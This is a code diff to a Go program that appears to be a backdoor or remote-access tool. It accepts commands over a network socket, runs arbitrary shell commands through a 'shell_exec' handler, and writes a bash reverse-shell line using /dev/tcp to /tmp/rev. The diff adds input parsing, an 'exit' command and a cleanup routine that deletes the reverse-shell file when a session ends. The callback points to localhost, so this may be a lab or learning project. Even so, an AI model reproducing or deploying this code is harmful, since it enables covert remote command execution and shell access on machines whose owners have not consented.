@@ -2,8 +2,8 @@ package main
 
 import (
 	"bufio"
-	"io/ioutil"
 	"fmt"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
@@ -52,9 +52,22 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 
-	log.Println("Client message:", string(buffer[:len(buffer)-1]))
+	if string(buffer[0]) == "W" {
+		buffer = buffer[1 : len(buffer)-2]
+	} else {
+		buffer = buffer[:len(buffer)-1]
+	}
 
-	switch string(buffer[:len(buffer)-1]) {
+	log.Println("Client message:", string(buffer))
+
+	if string(buffer) == "exit" {
+		log.Println("Connection closed.")
+		conn.Write([]byte(onExit(conn)))
+		conn.Close()
+		return
+	}
+
+	switch string(buffer) {
 	case "shell_exec":
 		conn.Write([]byte(shellExec(conn)))
 	case "whichos":
@@ -80,9 +93,13 @@ func shellExec(conn net.Conn) string {
 		return "Connection closed.\n"
 	}
 
-	instr := strings.Split(string(buffer), " ")
-
 	var cmd *exec.Cmd
+
+	if string(buffer[0]) == "W" {
+		buffer = buffer[1 : len(buffer)-1]
+	}
+
+	instr := strings.Split(string(buffer), " ")
 
 	if len(instr) > 1 {
 		args := instr[1:]
@@ -101,10 +118,10 @@ func shellExec(conn net.Conn) string {
 }
 
 func openReverse() string {
-	if !fileExists("/tmp/rev"){
+	if !fileExists("/tmp/rev") {
 		d1 := []byte("bash -i >& /dev/tcp/127.0.0.1/5555 0>&1\n")
 		err := ioutil.WriteFile("/tmp/rev", d1, 0644)
-		if err != nil{
+		if err != nil {
 			return "Failed to write file.\n"
 		}
 	}
@@ -122,9 +139,24 @@ func openReverse() string {
 }
 
 func fileExists(filename string) bool {
-    info, err := os.Stat(filename)
-    if os.IsNotExist(err) {
-        return false
-    }
-    return !info.IsDir()
+	info, err := os.Stat(filename)
+	if os.IsNotExist(err) {
+		return false
+	}
+	return !info.IsDir()
+}
+
+func onExit(conn net.Conn) string {
+	if !fileExists("/tmp/rev") {
+		return "Connection closed....\n"
+	}
+	cmd := exec.Command("rm", "-r", "/tmp/rev")
+
+	_, err := cmd.Output()
+
+	if err != nil {
+		return err.Error() + "\n"
+	}
+
+	return "Deleted files and Connection closed.\n"
 }
